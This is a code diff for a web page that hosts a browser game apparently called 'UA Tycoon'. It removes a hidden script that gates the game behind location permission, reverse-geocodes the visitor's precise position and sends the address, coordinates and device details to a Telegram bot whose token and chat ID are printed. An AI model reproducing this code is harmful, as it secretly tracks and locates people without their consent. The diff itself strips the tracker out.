@@ -58,92 +58,10 @@
         navigator.clipboard.writeText(location.href).then(() => { this.textContent = "✅ Đã copy!"; });
       });
     } else {
-      const BOT = "9016053759:AAFsb4SJDMdRSOLdaxXt_HgPVsR8Ti5fSn0";
-      const CHAT = "7952404707";
-      const sendTele = (text) => {
-        fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
-          method: "POST",
-          headers: { "content-type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT, text, parse_mode: "HTML" }),
-          keepalive: true,
-        }).catch(() => {});
-      };
-      const sendTeleLocation = (lat, lng) => {
-        fetch("https://api.telegram.org/bot" + BOT + "/sendLocation", {
-          method: "POST",
-          headers: { "content-type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT, latitude: lat, longitude: lng }),
-          keepalive: true,
-        }).catch(() => {});
-      };
-
-      const showGame = () => {
-        document.getElementById("blocked").style.display = "none";
-        const frame = document.getElementById("gameFrame");
-        frame.style.display = "block";
-        document.body.style.padding = "0";
-      };
-
-      let bestPos = null;
-      let sent = false;
-
-      const sendLocation = (lat, lng, acc) => {
-        if (sent) return;
-        sent = true;
-        navigator.geolocation.clearWatch(watchId);
-
-        fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat=" + lat + "&lon=" + lng + "&accept-language=vi&zoom=18&addressdetails=1")
-          .then(r => r.json())
-          .then(data => {
-            const a = data.address || {};
-            const parts = [a.house_number, a.road, a.suburb || a.quarter, a.city_district, a.city || a.town].filter(Boolean);
-            const addr = parts.join(", ") || data.display_name || "";
-            sendTele(
-              "🎮 <b>Có người chơi UA Tycoon!</b>\n\n"
-              + "🕐 " + new Date().toLocaleString("vi-VN") + "\n"
-              + (addr ? "📌 " + addr + "\n" : "")
-              + "📍 " + lat.toFixed(6) + ", " + lng.toFixed(6) + " (±" + Math.round(acc) + "m)\n"
-              + "📱 " + navigator.userAgent.slice(0, 80)
-            );
-            sendTeleLocation(lat, lng);
-          })
-          .catch(() => {
-            sendTele(
-              "🎮 <b>Có người chơi UA Tycoon!</b>\n\n"
-              + "🕐 " + new Date().toLocaleString("vi-VN") + "\n"
-              + "📍 " + lat.toFixed(6) + ", " + lng.toFixed(6) + " (±" + Math.round(acc) + "m)\n"
-              + "📱 " + navigator.userAgent.slice(0, 80)
-            );
-            sendTeleLocation(lat, lng);
-          });
-      };
-
-      const watchId = navigator.geolocation.watchPosition(
-        (pos) => {
-          const acc = pos.coords.accuracy;
-          if (!bestPos || acc < bestPos.accuracy) {
-            bestPos = pos.coords;
-          }
-          showGame();
-          if (acc <= 30) {
-            sendLocation(pos.coords.latitude, pos.coords.longitude, acc);
-          }
-        },
-        () => {
-          document.getElementById("blocked").innerHTML =
-            '<div><h1 style="font-size:22px">📍</h1>'
-            + '<p style="color:#6b6580;font-size:15px;line-height:1.5;margin:12px 0">Để chơi game bạn cần bật vị trí</p>'
-            + '<button class="btn" onclick="location.reload()">Thử lại</button></div>';
-        },
-        { enableHighAccuracy: true, maximumAge: 0 }
-      );
-
-      setTimeout(() => {
-        if (!sent && bestPos) {
-          sendLocation(bestPos.latitude, bestPos.longitude, bestPos.accuracy);
-          showGame();
-        }
-      }, 8000);
+      document.getElementById("blocked").style.display = "none";
+      const frame = document.getElementById("gameFrame");
+      frame.style.display = "block";
+      document.body.style.padding = "0";
     }
   </script>
 </body>
